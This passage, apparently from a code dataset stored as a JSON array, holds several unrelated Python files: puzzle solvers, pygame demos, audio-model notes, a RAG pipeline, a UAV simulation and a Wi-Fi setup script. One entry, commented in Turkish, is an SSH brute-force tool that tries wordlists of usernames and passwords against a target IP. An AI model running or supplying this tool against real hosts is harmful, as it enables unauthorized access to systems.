part[traitMap[trait]] > int(amount):\n                    currentWorkflow = dest\n                    break\n\n    if currentWorkflow == \"A\":\n        return True\n    return False\n\ndef solvepart2():\n    #read in data\n    data = fileRead(\"input.txt\")\n    workflows = {}\n    parts = []\n    for rawRow in data:\n        row = rawRow.strip()\n        if row == \"\":\n            break\n        line = row.split(\"{\")\n        name = line[0]\n        steps = line[1][:-1].split(\",\")\n        workflows[name] = tuple(steps)\n\n    #run recursive function to determine the number of possible parts\n    numParts = acceptOrRejectRange(((1,4001),(1,4001),(1,4001),(1,4001)), \"in\", workflows)\n    print(numParts)\n\n    #determine whether each part should be rejected or not\n    \n#recursively takes a range through the workflow, splitting it into multiple ranges as necessary\n#returns number of possible accepted parts\ndef acceptOrRejectRange(partRange, currentWorkflow, workflows):\n    if (currentWorkflow == \"R\"):\n        return 0\n    if (currentWorkflow == \"A\"):\n        print(partRange, (partRange[0][1] - partRange[0][0]) * (partRange[1][1] - partRange[1][0]) * (partRange[2][1] - partRange[2][0]) * (partRange[3][1] - partRange[3][0]))\n        return (partRange[0][1] - partRange[0][0]) * (partRange[1][1] - partRange[1][0]) * (partRange[2][1] - partRange[2][0]) * (partRange[3][1] - partRange[3][0])\n    \n    sum = 0\n    curPartRange = list(partRange)\n    rules = workflows[currentWorkflow]\n    for rule in rules:\n        if (\"<\" not in rule) and (\">\" not in rule):\n            sum = sum + acceptOrRejectRange(curPartRange, rule, workflows)\n            break\n        comp, dest = rule.split(\":\")\n        if \"<\" in comp:\n            trait, splitPos = comp.split(\"<\")\n            splitPos = int(splitPos)\n            newPartRange = curPartRange.copy()\n            print(\"<\", newPartRange[traitMap[trait]], splitPos)\n            newPartRange[traitMap[trait]] = (newPartRange[traitMap[trait]][0], splitPos)\n            curPartRange[traitMap[trait]] = (splitPos, curPartRange[traitMap[trait]][1])\n            sum = sum + acceptOrRejectRange(tuple(newPartRange), dest, workflows)\n        else:\n            trait, splitPos = comp.split(\">\")\n            splitPos = int(splitPos)\n            newPartRange = curPartRange.copy()\n            print(\">\", newPartRange[traitMap[trait]], splitPos)\n            newPartRange[traitMap[trait]] = (splitPos+1, newPartRange[traitMap[trait]][1])\n            curPartRange[traitMap[trait]] = (curPartRange[traitMap[trait]][0], splitPos+1)\n            sum = sum + acceptOrRejectRange(tuple(newPartRange), dest, workflows)\n    return sum\n\ndef fileRead(name):\n    data = []\n    f = open(name, \"r\")\n    for line in f:\n        data.append(line);\n    return data\n\n\nsolvepart2()",
    "import socket  \nfrom colorama import Fore  \nimport paramiko  \nimport threading  \n\nip = input(\"Hedef \u0130p Giriniz : \")\nport = 22\n\ndef port_tara(ip, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1.25)\n        s.connect((ip, port))\n        print(Fore.GREEN + \"{} [\u221a] portu a\u00e7\u0131k. L\u00fctfen Bekleyin...\".format(port))\n        s.close()\n    except socket.error:\n        print(Fore.RED + \"{} [\u00d7] portu kapal\u0131. Tool'dan \u00e7\u0131k\u0131l\u0131yor...\".format(port))\n        exit()\n        \n        \nusernamelist = input(\"SSH kullan\u0131c\u0131 ad\u0131 wordlistini giriniz: \")\npasswordlist = input(\"SSH \u015fifre wordlistini giriniz: \")\n\ndef ssh_brute():\n    ssh = paramiko.SSHClient()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    with open(usernamelist, 'r') as users:\n        with open(passwordlist, 'r') as passwords:\n            for username in users:\n                username = username.strip() \n                for password in passwords:\n                    password = password.strip()\n                    try:\n                        ssh.connect(hostname=ip, port=port, username=username, password=password)\n                        print(Fore.GREEN + \"[\u2713] Ba\u015far\u0131l\u0131. \u015eifre ve Kullan\u0131c\u0131 ad\u0131 Bulundu \", \"Kullan\u0131c\u0131 Ad\u0131:\", username, \"\u015eifre:\", password)\n                        ssh.close()\n                        return\n                    except paramiko.AuthenticationException:\n                        print(Fore.RED + \"[\u00d7] Ba\u015far\u0131s\u0131z Kullan\u0131c\u0131 ad\u0131 ve \u015eifre Bulunamad\u0131\")\n                    except paramiko.SSHException as e:\n                        print(Fore.RED + f\"[\u00d7] SSH ba\u011flant\u0131 hatas\u0131: {e}\")\n                        \n                        \nport_tara(ip, port)\nstart = therading.Thread(target=ssh_brute)\nstart.start()\n                  \n",
    "import pygame\n\n# Initialize pygame\npygame.init()\n\n# Set up the game window\nscreen_width = 1900\nscreen_height = 1024\nscreen = pygame.display.set_mode((screen_width, screen_height))\npygame.display.set_caption(\"TMNT Game\")\n\n# Load images\nbackground_image = pygame.image.load(\"background.gif\")\nturtle_image = pygame.image.load(\"turtle.png\")\nshredder_image = pygame.image.load(\"shredder.webp\")\nbebop_image = pygame.image.load(\"bebop.webp\")\nrocksteady_image = pygame.image.load(\"rocksteady.webp\")\n\n# Set initial positions\nturtle_x = 100\nturtle_y = 300\nshredder_x = 600\nshredder_y = 300\nbebop_x = 400\nbebop_y = 200\nrocksteady_x = 400\nrocksteady_y = 400\n\n# Game loop\nrunning = True\nwhile running:\n  # Handle events\n  for event in pygame.event.get():\n    if event.type == pygame.QUIT:\n      running = False\n\n  # Update game logic\n\n  # Draw background\n  screen.blit(background_image, (0, 0))\n\n  # Draw characters\n  screen.blit(turtle_image, (turtle_x, turtle_y))\n  screen.blit(shredder_image, (shredder_x, shredder_y))\n  screen.blit(bebop_image, (bebop_x, bebop_y))\n  screen.blit(rocksteady_image, (rocksteady_x, rocksteady_y))\n\n  # Update display\n  pygame.display.flip()\n\n# Quit the game\npygame.quit()",
    "from transformers import Wav2Vec2Processor, Wav2Vec2Model\nimport torch\nimport librosa\nimport datetime\n\n\n# \u52a0\u8f7d\u9884\u8bad\u7ec3\u7684\u6a21\u578b\u548c\u5904\u7406\u5668\nprocessor = Wav2Vec2Processor.from_pretrained(\"facebook/wav2vec2-base-960h\")\nmodel = Wav2Vec2Model.from_pretrained(\"facebook/wav2vec2-base-960h\")\n\n\n\"\"\"\nwav2vector\u548cmel\u7684\u5173\u7cfb\n\"\"\"\n# \u52a0\u8f7d\u97f3\u9891\u6587\u4ef6\naudio_file_path = \"/mnt/sdb/cxh/liwen/Imitator/assets/demo/audio1.wav\"  \nspeech_array, sampling_rate = librosa.load(audio_file_path, sr=16000)\n\nduration = librosa.get_duration(speech_array, sampling_rate)\nduration_in_ms = duration * 1000\ntime = str(datetime.timedelta(milliseconds=duration_in_ms))\nprint(time)  # 0:00:03.833375\n\n# print(speech_array)\n# \u4f7f\u7528\u5904\u7406\u5668\u52a0\u8f7d\u97f3\u9891\u6587\u4ef6\u5e76\u63d0\u53d6\u7279\u5f81, \u8fd9\u4e2apadding\u53ef\u80fd\u4f1a\u5e26\u6765\u54ea\u4e9b\u5f71\u54cd\n# When used in normal mode, this method forwards all its arguments to Wav2Vec2FeatureExtractor\u2019s __call__()\n\"\"\"\nWav2Vec2FeatureExtractor\u7684call\u65b9\u6cd5\n- raw_speech (np.ndarray, List[float], List[np.ndarray], List[List[float]]) \u2013 The sequence or batch of sequences to be padded. Each sequence can be a numpy array, a list of float values, a list of numpy arrays or a list of list of float values.\n- padding (bool, str or PaddingStrategy, optional, defaults to False) \u2013\n  Select a strategy to pad the returned sequences (according to the model\u2019s padding side and padding index) among:\n    - True or 'longest': Pad to the longest sequence in the batch (or no padding if only a single sequence if provided).\n    - 'max_length': Pad to a maximum length specified with the argument max_length or to the maximum acceptable input length for the model if that argument is not provided.\n    - False or 'do_not_pad' (default): No padding (i.e., can output a batch with sequences of different lengths).\n- max_length (int, optional) \u2013 Maximum length of the returned list and optionally padding length (see above).\n- pad_to_multiple_of (int, optional) \u2013\n  If set will pad the sequence to a multiple of the provided value.\n  This is especially useful to enable the use of Tensor Cores on NVIDIA hardware with compute capability >= 7.5 (Volta), or on TPUs which benefit from having sequence lengths be a multiple of 128.\n- return_attention_mask (bool, optional) \u2013\n  Whether to return the attention mask. If left to the default, will return the attention mask according to the specific feature_extractor\u2019s default.\n- return_tensors (str or TensorType, optional) \u2013\n  If set, will return tensors instead of list of python integers. Acceptable values are:\n   - 'tf': Return TensorFlow tf.constant objects.\n   - 'pt': Return PyTorch torch.Tensor objects.\n   - 'np': Return Numpy np.ndarray objects.\n- sampling_rate (int, optional) \u2013 The sampling rate at which the raw_speech input was sampled. It is strongly recommended to pass sampling_rate at the forward call to prevent silent errors.\n- padding_value (float, defaults to 0.0)\n\"\"\"\ninput_values = processor(speech_array, return_tensors=\"pt\", padding=True) # batch=1\u7684\u8bdd\uff0cpadding\u65e0\u6548\n\n# \u83b7\u53d6\u8f93\u5165\u7279\u5f81\ninput_values = input_values.input_values\nprint(model)\n\"\"\"\nWav2Vec2Model(\n  (feature_extractor): Wav2Vec2FeatureEncoder(\n    (conv_layers): ModuleList(\n      (0): Wav2Vec2GroupNormConvLayer(\n        (conv): Conv1d(1, 512, kernel_size=(10,), stride=(5,), bias=False)\n        (activation): GELUActivation()\n        (layer_norm): GroupNorm(512, 512, eps=1e-05, affine=True)\n      )\n      (1-4): 4 x Wav2Vec2NoLayerNormConvLayer(\n        (conv): Conv1d(512, 512, kernel_size=(3,), stride=(2,), bias=False)\n        (activation): GELUActivation()\n      )\n      (5-6): 2 x Wav2Vec2NoLayerNormConvLayer(\n        (conv): Conv1d(512, 512, kernel_size=(2,), stride=(2,), bias=False)\n        (activation): GELUActivation()\n      )\n    )\n  )\n  # 5*2*2*2*2*2*2 = 320\n  # 320/16000=0.02\n  (feature_projection): Wav2Vec2FeatureProjection(\n    (layer_norm): LayerNorm((512,), eps=1e-05, elementwise_affine=True)\n    (projection): Linear(in_features=512, out_features=768, bias=True)\n    (dropout): Dropout(p=0.1, inplace=False)\n  )\n  (encoder): Wav2Vec2Encoder(\n    (pos_conv_embed): Wav2Vec2PositionalConvEmbedding(\n      (conv): ParametrizedConv1d(\n        768, 768, kernel_size=(128,), stride=(1,), padding=(64,), groups=16\n        (parametrizations): ModuleDict(\n          (weight): ParametrizationList(\n            (0): _WeightNorm()\n          )\n        )\n      )\n      (padding): Wav2Vec2SamePadLayer()\n      (activation): GELUActivation()\n    )\n    (layer_norm): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n    (dropout): Dropout(p=0.1, inplace=False)\n    (layers): ModuleList(\n      (0-11): 12 x Wav2Vec2EncoderLayer(\n        (attention): Wav2Vec2Attention(\n          (k_proj): Linear(in_features=768, out_features=768, bias=True)\n          (v_proj): Linear(in_features=768, out_features=768, bias=True)\n          (q_proj): Linear(in_features=768, out_features=768, bias=True)\n          (out_proj): Linear(in_features=768, out_features=768, bias=True)\n        )\n        (dropout): Dropout(p=0.1, inplace=False)\n        (layer_norm): LayerNorm((768,), eps=1e-05, elementwise_affine=True)\n        (",
    "import numpy as np\nimport pygame\nfrom pygame import Vector2\nfrom pygame import draw\nfrom pygame.draw import circle, line, aaline, rect\nfrom pygame.transform import scale, smoothscale\nimport pygame.display\nimport pygame.mouse\nimport pygame.event\nimport pygame.time\nimport neural_network\nfrom handwritten_digits_recognition_tools import get_digit, image_to_input\nimport pygame.surfarray\nimport pygame.font\n\npygame.init()\n\nGRAY = (50, 50, 50, 50)\nBLACK = (0, 0, 0)\nWHITE = (255, 255, 255)\nWHITE_GRAY = (150, 150, 150, 50)\n# weigth, heigth = 1080, 2160  # for phone\nweigth,heigth=400,800#celiphone\n\nscreen = pygame.display.set_mode((weigth, heigth))\nscreen.fill(GRAY)\nclock = pygame.time.Clock()\n\ncanvas_rect = pygame.Rect((0, heigth / 4), (weigth, weigth))\nrect(screen, BLACK, canvas_rect)\ndigits_rect = pygame.Rect(((weigth / 2 - heigth / 8, 0), (heigth / 4, heigth / 4)))\n\n\n# pen_size = 80\n# font_size = 330\npen_size=15\nfont_size=150\ndigits_font = pygame.font.SysFont(\"\", font_size)\n\ninput_layer = pygame.Surface(canvas_rect.size)\npixel_layer = pygame.Surface(canvas_rect.size, pygame.SRCALPHA)\n\nlast_pos = None\n\n\ndef offset(pos):\n    \"\"\"offset to canvas\"\"\"\n    return Vector2(pos) - Vector2(canvas_rect.topleft)\n\n\ndef is_drawing(pos):\n    return pygame.mouse.get_pressed(3)[0] and canvas_rect.collidepoint(pos)\n\n\nnetwork = neural_network.NeuralNetwork.create_from_file(\n    \"data/training_completed_data.json\"\n)\n\nlabel_size = (30, 30)\nlabel_leftop = Vector2(weigth / 22, heigth / 5)\nlabel_offect = Vector2(weigth / 11, 0)\nlabel = [\n    (\n        pygame.Surface(label_size),\n        pygame.Rect(label_leftop + label_offect * n, label_size),\n    )\n    for n in range(10)\n]\n\n\nrunning = True\nwhile running:\n    clock.tick(30)\n\n    pos = Vector2(pygame.mouse.get_pos())\n\n    for event in pygame.event.get():\n        if event.type == pygame.MOUSEBUTTONDOWN:\n            last_pos = None\n            if not canvas_rect.collidepoint(pos):\n                input_layer.fill(BLACK)\n                pixel_layer.fill(BLACK)\n\n        if event.type == pygame.MOUSEBUTTONUP:\n            last_pos = None\n\n        if event.type == pygame.QUIT:\n            running = False\n\n    # drawing\n    if is_drawing(pos):\n        if last_pos == None:\n            last_pos = pos\n\n        line(input_layer, WHITE, offset(pos), offset(last_pos), pen_size)\n        # circle(input_layer,WHITE,offset(pos),pen_size/2)\n        # circle(input_layer,WHITE,offset((pos+last_pos)/2),pen_size/2)\n\n        pixel_layer = smoothscale(input_layer, (28, 28))\n\n        pixels_array = np.transpose(pygame.surfarray.pixels_red(pixel_layer)).reshape(\n            784\n        )\n\n        digit = network.get(image_to_input(pixels_array))\n        for n in range(len(label)):\n            color = ((digit[n]) * 255, (digit[n]) * 255, (digit[n]) * 255)\n            label[n][0].fill((color))\n        digit_surface = digits_font.render(str(get_digit(digit)), True, WHITE)\n\n        rect(screen, GRAY, digits_rect)\n\n        for l, r in label:\n            screen.blit(l, l.get_rect(center=r.center))\n\n        screen.blit(digit_surface, digit_surface.get_rect(center=digits_rect.center))\n\n    screen.blit(scale(pixel_layer, canvas_rect.size), canvas_rect)\n    # screen.blit(input_layer,canvas_rect)\n    pygame.display.update()\n\n    last_pos = pos\n\npygame.quit()\n",
    "# Import the necessary modules and functions\nimport os\nfrom dotenv import load_dotenv\nimport code\nfrom unstructured.partition.pdf import partition_pdf\nfrom pydantic import BaseModel\nfrom typing import Any\n\nfrom langchain_openai import ChatOpenAI, OpenAIEmbeddings\nfrom langchain.retrievers import MultiVectorRetriever\nfrom langchain.storage import InMemoryStore\nfrom langchain_community.vectorstores.elasticsearch import ElasticsearchStore\n\nfrom elasticsearch import Elasticsearch\n\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.runnables import (\n  RunnableLambda,\n  RunnablePassthrough\n)\nfrom langchain_core.documents import Document\nfrom langchain.output_parsers import JsonOutputToolsParser\n\nimport uuid\nfrom typing import Union\nfrom operator import itemgetter\nimport pickle\nfrom itertools import chain\nfrom langchain_core.pydantic_v1 import SecretStr\n\n# Load the .env file. By default, it looks for the .env file in the same directory as the script being run, or you can specify the path as an argument.\nload_dotenv()\n\nOPENAI_API_KEY=os.getenv(\"OPENAI_API_KEY\", \"\")\nAPI_KEY_UNSTRUCTURED = os.getenv(\"API_KEY_UNSTRUCTURED\", \"\")\nAPI_BASE_URL_UNSTRUCTURED = os.getenv(\"API_BASE_URL_UNSTRUCTURED\", \"\")\nES_HOST = os.getenv(\"ES_HOST\", \"\")\nES_PORT = int(os.getenv(\"ES_PORT\", \"9200\"))\nES_INDEX = os.getenv(\"ES_INDEX\", \"\")\n\nmodel = ChatOpenAI(temperature=0, model=\"gpt-3.5-turbo-1106\", api_key=SecretStr(OPENAI_API_KEY) )\nVectorStoreSingleton = None\nESSingleton = None\n\nclass Element(BaseModel):\n  type: str\n  text: Any\n\n# TODO: These should really be loaded on the fly from the filesystem\n# Define list containing pdf paths and pdf names to be used throughout later on\npdf_paths = [\n            # \"./docs/amazon/amazon-2019.pdf\",\n            #  \"./docs/amazon/amazon-2020.pdf\",\n            #  \"./docs/amazon/amazon-2021.pdf\",\n            #  \"./docs/amazon/amazon-2022.pdf\",\n            #  \"./docs/amazon/amazon-2023.pdf\", \n             \"./docs/amazon/amazon-2024.pdf\",\n            #  \"./docs/alphabet/20210203-alphabet-10k\",\n            #  \"./docs/alphabet/20220202-alphabet-10k\",\n             \"./docs/alphabet/goog-10-k-2023.pdf\",\n            #  \"./docs/alphabet/goog-10-k-q4-2022.pdf\"\n]\npdfs = [\n        # \"amazon-2019.pdf\",\n        # \"amazon-2020.pdf\", \n        # \"amazon-2021.pdf\", \n        # \"amazon-2023.pdf\", \n        \"amazon-2024.pdf\",\n        # \"20210203-alphabet-10k\",\n        # \"20220202-alphabet-10k\",\n        \"goog-10-k-2023.pdf\",\n        # \"goog-10-k-q4-2022.pdf\"\n        ]\n\n#################### ES / Vector Store Funcs ####################\ndef getVectorStore():\n  global VectorStoreSingleton\n  if VectorStoreSingleton is None:\n    print(\"Setting up vector store\")\n    VectorStoreSingleton = ElasticsearchStore(\n        # https://python.langchain.com/docs/integrations/vectorstores/elasticsearch\n        embedding=OpenAIEmbeddings(model=\"text-embedding-3-small\", api_key=SecretStr(OPENAI_API_KEY)),\n        es_url=\"http://\"+ES_HOST+\":\"+str(ES_PORT),\n        index_name=ES_INDEX,\n        strategy=ElasticsearchStore.ApproxRetrievalStrategy()\n    )\n  else:\n    print(\"Vector store already set up\")\n\n  return VectorStoreSingleton\n\ndef get_es():\n  global ESSingleton\n  if ESSingleton is None:\n    print(\"Setting up ES\")\n    ESSingleton = Elasticsearch([{'host': ES_HOST, 'port': ES_PORT, 'scheme': 'http'}])\n  else:\n    print(\"ES already set up\")\n\n  return ESSingleton\n\n#################### Data Loading & Processing Funcs ####################\ndef processPDFsToPickles():\n  raw_pdfs_elements = []\n\n  # Get parsed elements for each PDF\n  for i,pdf_path in enumerate(pdf_paths):\n    print(f\"processing: {pdf_path}\")\n    raw_pdfs_elements.append(\n      partition_pdf(\n        # https://unstructured-io.github.io/unstructured/apis/api_parameters.html\n        filename=pdf_path,\n        extract_images_in_pdf=False,\n        infer_table_structure=True,\n        chunking_strategy=\"by_title\",\n        max_characters=1800,\n        new_after_n_chars=1500,\n        combine_text_under_n_chars=1000,\n        image_output_dir_path=\"./\",\n        url=API_BASE_URL_UNSTRUCTURED,\n        token=API_KEY_UNSTRUCTURED,\n        verbose=True\n      )\n    )\n\n    # store the parsed elements as pickles to reuse them whenever necessary\n    with open(f'{pdf_path}-{i}.pkl', 'wb') as f:\n      print(f\"saving: {pdf_path}-{i}\")\n      pickle.dump(raw_pdfs_elements[i], f)\n\n  return raw_pdfs_elements\n\ndef loadDataFromPickles(pickle_paths):\n  # Load from pickle\n  raw_pdf_elements = []\n  for pdf in pickle_paths:\n    with open(f\"{pdf}\", 'rb') as f:\n      raw_pdf_elements.append(pickle.load(f))\n      \n  return raw_pdf_elements\n\ndef processTablesAndText(raw_pdfs_elements):\n  # Categorize by type\n  print(\"Categorizing elements\")\n  categorized_elements = [\n      [\n          Element(type=\"table\", text=str(element.metadata.text_as_html))\n          if \"unstructured.documents.elements.Table\" in str(type(element))\n          else Element(type",
    "\n\nif sys.version_info.major == 2:\n    import Tkinter as tk\nelse:\n    import tkinter as tk\nimport matplotlib.pyplot as plt\n\nUNIT =  1              \nIOT_H = 100          \nIOT_W = 100          \nMax_Hight = 100        \nMin_Hight = 30         \n\nD_k = 1024\nt_min = 1\nt_max = 3\n\n\nB = 2000  \nN_0 =mt.pow(10, ((-169 / 3) / 10))\nXi =  mt.pow(10, (3/10))\na = 9.61\nb = 0.16  \neta_los = 0.01  \neta_nlos = 0.2  \nA = eta_los - eta_nlos  \nC = 0.2 * np.log10(\n    4 * np.pi * 9 / 3) + eta_nlos  \nPower = 0.5 * mt.pow(10, 3)  \n\n\n\n\n\nclass RIS_UAV(object):\n    def __init__():\n        super(RIS_UAV, self).__init__()\n        self.N_slot = 3000 \n        self.x_s = 10 \n        self.y_s = 10 \n        self.h_s = 2  \n        self.GTs = len(W_K)  \n        self.l_o_v = 100*self.h_s  \n        self.l_f_v = 100*self.h_s  \n        self.l_o_h = [500,600] \n        self.eps =12000 \n        self.finish = False \n        self.w_k = np.zeros((self.GTs, 2), dtype=np.float)  \n        self.u_k = np.zeros((self.GTs, 1), dtype=np.float)  \n        self.w_k=W_K\n        self.u_k=U_K\n        self.W_R = Support \n        self.Z_R = 50  \n        self.M = 100 \n        self.support=Support\n        self.center=Center\n        self.r=R\n    \n        self.action_space_uav_horizontal = ['n', 's', 'e','w','h']\n        self.action_space_uav_vertical = ['a', 'd', 's']\n        self.n_actions  = len(self.action_space_uav_horizontal)*len(self.action_space_uav_vertical)*self.GTs*(np.int(t_max/0.1)-np.int(t_min/0.1)+1)\n        self.n_features = 13 \n\n        self.actions = np.zeros((np.int(self.n_actions),1+4), dtype=np.int)\n        index = 0\n        for h in range(len(self.action_space_uav_horizontal)):\n            for v in range(len(self.action_space_uav_vertical)):\n                for s in range(self.GTs):\n                    for t in range(np.int(t_min/0.1), np.int((t_max)/0.1)+1):\n                        self.actions[index,:]=[index, h, v, s, t]\n                        index = index + 1\n        self._build_ris_uav()\n\n\n\n    def _build_ris_uav(self):\n        self.d_s = np.zeros((self.N_slot, self.GTs), dtype=np.float)  #data processed  #\u6570\u636e\u5904\u7406\n        self.energy = np.zeros((1,self.N_slot), dtype=np.float)  # propulsion  energy of the UAV \u65e0\u4eba\u673a\u7684\u63a8\u8fdb\u80fd\u91cf\n        self.GNs = np.zeros((1, self.GTs), dtype=np.float)\n        return\n\n    def reset(self):\n       \n        self.d_s = np.zeros((self.N_slot, self.GTs), dtype=np.float)  # data processed\n        self.energy = np.zeros((1, self.N_slot), dtype=np.float)  # propulsion  energy of the UAV\n        self.GNs = np.zeros((1, self.GTs), dtype=np.float)\n        self.h_n = 100\n       \n        self.l_n = [50,60]\n        self.server=0\n        self.finish = False\n        self.slot = 0\n\n        return np.array([self.l_n[0], self.l_n[1], self.h_n,self.GNs[0,0],self.GNs[0,1],self.GNs[0,2],self.GNs[0,3],self.GNs[0,4],self.GNs[0,5],self.GNs[0,6],self.GNs[0,7],self.GNs[0,8],self.GNs[0,9]])\n\n    def link_rate (self, gt, RIS):\n        h = self.h_n * self.h_s #*\n        x = self.l_n[0]*self.x_s+0.5*self.x_s #*\n        y = self.l_n[1]*self.y_s+0.5*self.y_s #*  #\u6a2a\u5750\u6807\uff0c\u7eb5\u5750\u6807\n\n        d = np.sqrt(mt.pow(h, 2) + mt.pow(x - self.w_k[gt, 0], 2) + mt.pow(y - self.w_k[gt, 1], 2))#\u65e0\u4eba\u673a\u5230\u5730\u9762\u8282\u70b9\u7684\u6b27\u6c0f\u8ddd\u79bb*\n        d_ug = np.sqrt(mt.pow(h, 2) + mt.pow(x- self.w_k[gt,0],2) + mt.pow(y- self.w_k[gt,1],2))#\u65e0\u4eba\u673a\u5230\u5730\u9762\u8282\u70b9\u7684\u6b27\u6c0f\u8ddd\u79bb*\n        d_ur = np.sqrt(mt.pow(h-self.Z_R, 2) + mt.pow(self.W_R[0] - x, 2) + mt.pow(self.W_R[1] - y, 2))#\u65e0\u4eba\u673a\u5230RIS\u7684\u6b27\u5f0f\u8ddd\u79bb*\n        d_rg = np.sqrt(mt.pow(self.Z_R, 2) + mt.pow(self.W_R[0] - self.w_k[gt, 0], 2) + mt.pow(self.W_R[1] - self.w_k[gt, 1], 2))#RIS\u5230\u5730\u9762\u8282\u70b9\u7684\u6b27\u5f0f\u8ddd\u79bb*\n\n        if (np.sqrt(mt.pow(x- self.w_k[gt,0], 2) + mt.pow(y- self.w_k[gt,1], 2))>0):#\u5982\u679c\u8ddd\u79bb\u5927\u4e8e0\uff0c\u65e0\u4eba\u673a\u5230\u5730\u9762\u8282\u70b9*\n            ratio = h / np.sqrt(mt.pow(x - self.w_k[gt, 0], 2) + mt.pow(y - self.w_k[gt, 1], 2))#\u6bd4\u7387\u4e3ah\u9664\u4ee5d,\u6bd4\u7387\u4e3a\uff085\uff09\u4e2darctan\u5185\u7684\u503c*\n        else:\n            ratio = np.Inf   \n\n        p_los = 1 + a * mt.pow(np.exp(1), (a * b - b * np.arctan(ratio) * (180 / np.pi)))#\u963b\u585e\u6982\u7387\n        p_los = 1 / p_los\n        if RIS==True:\n            g_los = p_los*Power*mt.pow(Xi/(B*N_0*d_ug),2)    #UAV-GT\n            g_nlos =(1-p_los)*Power*mt.pow(self.M*Xi/(B*N_0*d_ur*d_rg),2)#UAV-RIS-GT\n            r = B * np.log2(1 + g_los + g_nlos)\n        if RIS == False:\n            L_km = A * p_los + C\n            r = B * np.log2(1 + Power * mt.pow(L_km/ (B * N_0*d),2))\n        return r/1000\n\n\n    def isout(self,center,r):\n        x = self.l_n[0] * self.x_s + 0.5 * self.x_s\n        y = self.l_n[1] * self.y_s + 0.5 * self.y_s\n        if(np.sqrt(mt.pow(x - center[0], 2) + mt.pow(y - center[1], 2))>r):\n            return True\n        else:\n            return False\n\n    def bad(self,action):\n        h = action[1]  \n        v = action[2]  \n        c_n = action[3]  \n        t_n = action[4]  \n\n        pre_l_n = self.l_n\n        pre_h_n = self.h_n\n\n        self.OtPoI = 0\n        self.enough = 0\n        if v == 0:  # ascending \u63d0\u5347\n            self.h_n = self.h_n + 1\n            if self.h_n > Max_Hight:\n                self.h_n = self.h_n - 1\n                ",
    "# // Author & Copyrighted by:  Quincy Rodge A. Macalalag\n# // Date: Upda to date 2024\n# // FIlename: PyBridge.py\n# // Copyright \u00a9 2024 Quincy Rodge A. Macalalag\n# // All rights reserved. This code and its accompanying documentation are protected by copyright law and international treaties. Unauthorized reproduction or distribution of this code, or any portion of it, may result in severe civil and criminal penalties, and will be prosecuted to the maximum extent possible under the law.\n# // For licensing inquiries or to obtain permission for usage, please contact qrodgemacalalag@gmail.com.\n\n\nimport time\nimport subprocess\n\n\ndef remove_wifi_credentials(interface, interface_path):\n    try:\n        # Read the contents of the interface configuration file\n        with open(interface_path, \"r\") as f:\n            lines = f.readlines()\n\n        # Filter out the lines related to the specified interface\n        new_lines = [\n            line\n            for line in lines\n            if not (\n                line.strip().startswith(f\"wpa-ssid {interface}\")\n                or line.strip().startswith(\"wpa-psk\")\n            )\n        ]\n\n        # Write the modified configuration back to the file\n        with open(interface_path, \"w\") as f:\n            f.writelines(new_lines)\n\n        # Restart networking services\n        subprocess.run([\"systemctl\", \"restart\", \"networking\"])\n\n        print(f\"Removed Wi-Fi credentials for interface {interface}.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef configure_wifi(new_ssid, interface, interface_path, networks, change_ssid=False):\n\n    if change_ssid:\n        if new_ssid not in networks:\n            return \"Invalid Network. Re run the program and enter valid network name\"\n        else:\n            passphrase_for_new_ssid = get_str(f\"Enter password for [{new_ssid}]: \")\n            try:\n                with open(interface_path, \"w\") as f:\n                    f.write(\"source /etc/network/interfaces.d/*\\n\")\n                    f.write(\"auto lo\\n\")\n                    f.write(\"iface lo inet loopback\\n\\n\")\n                    f.write(f\"allow-hotplug {interface}\\n\")\n                    f.write(f\"iface {interface} inet dhcp\\n\")\n                    f.write(f\"\\twpa-ssid {new_ssid}\\n\")\n                    f.write(f\"\\twpa-psk {passphrase_for_new_ssid}\\n\")\n\n                subprocess.run([\"sudo\", \"systemctl\", \"restart\", \"networking\"])\n\n                time.sleep(2)\n\n                iwconfig_output = subprocess.check_output(\n                    [\"iwconfig\", interface], text=True\n                )\n\n                if \"Access Point: Not-Associated\" in iwconfig_output:\n                    print(\n                        \"Error: Network configuration was not updated. Incorrect password?\"\n                    )\n                    return\n\n                subprocess.run([\"sudo\", \"systemctl\", \"restart\", \"NetworkManager\"])\n\n                print(\"Interface configuration updated successfully.\")\n            except Exception as e:\n                print(f\"Error what: {e}\")\n            finally:\n                print(\"Done Configuring interfaces\")\n                exit(0)\n\n    ssid = get_str(\"Enter ssid: \")\n    passphrase = get_str(f\"Enter password for [{ssid}]: \")\n\n    with open(interface_path, \"w\") as f:\n        f.write(\"source /etc/network/interfaces.d/*\\n\")\n        f.write(\"auto lo\\n\")\n        f.write(\"iface lo inet loopback\\n\\n\")\n        f.write(f\"allow-hotplug {interface}\\n\")\n        f.write(f\"iface {interface} inet dhcp\\n\")\n        f.write(f\"\\twpa-ssid {ssid}\\n\")\n        f.write(f\"\\twpa-psk {passphrase}\\n\")\n\n    subprocess.run([\"sudo\", \"systemctl\", \"restart\", \"networking\"])\n\n    time.sleep(2)\n\n    iwconfig_output = subprocess.check_output([\"iwconfig\", interface], text=True)\n\n    if \"Access Point: Not-Associated\" in iwconfig_output:\n        print(\"Error: Network configuration was not updated. Incorrect password?\")\n        return\n\n    subprocess.run([\"sudo\", \"systemctl\", \"restart\", \"NetworkManager\"])\n\n    print(\"Interface configuration updated successfully.\")\n\n\ndef get_available_networks():\n    try:\n        # Run iwlist command to list available networks and filter by ESSID\n        iwlist_process = subprocess.Popen(\n            [\"iwlist\", \"wlan0\", \"scan\"], stdout=subprocess.PIPE\n        )\n        grep_process = subprocess.Popen(\n            [\"grep\", \"ESSID\"],\n            stdin=iwlist_process.stdout,\n            stdout=subprocess.PIPE,\n            text=True,\n        )\n        iwlist_process.stdout.close()  # Close the stdout of the first process\n        output = grep_process.communicate()[0]\n\n        # Check if the command was successful\n        if grep_process.returncode == 0:\n            # Extract SSID from each line\n            networks = [\n                line.split(\":\")[1].strip().replace('\"', \"\")\n                for line in output.split(\"\\n\")\n                if line.strip()  # Skip empty lines\n            ]\n            return networks\n        else:\n            print(\"Error: Failed to list",
